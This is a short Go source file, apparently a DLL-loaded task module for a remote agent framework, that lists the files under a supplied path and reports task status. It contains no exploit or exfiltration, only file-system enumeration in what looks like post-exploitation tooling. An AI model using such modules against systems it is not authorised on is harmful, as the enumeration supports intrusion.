package main

/*
#include <stdlib.h>
*/
import "C"

import (
	"sync"
)

type Task struct {
	TaskId string   `json:"taskid"`
	Path   string `json:"path"`

	// General Purpose
	status   string
	tasktype string

	mu *sync.Mutex
}

func InitialiseTask(task *Task) error {
	task.tasktype = "respinlineexecute"
	task.mu = &sync.Mutex{}
	return nil
}

func TaskHandler(task *Task) (stdout []byte, err error) {

	stdout, err = listFiles(task.Path)
	task.status = "completed"
	if err != nil {
		Println("Fail")
		task.status = "failed"
		return []byte(err.Error()), err
	}
	Println("Done Executing")
	Println("Result From DLL --->")
	return stdout, err
}

// Tell us if task if done (failed or completed)
func IsTaskDone(task Task) bool {
	if task.status == "completed" || task.status == "failed" {
		return true
	}
	return false
}

// Return Task Status
func ComputeTaskStatus(task Task) string {
	return task.status
}

// Return Task Type
func ComputeTaskType(task Task) string {
	return task.tasktype
}
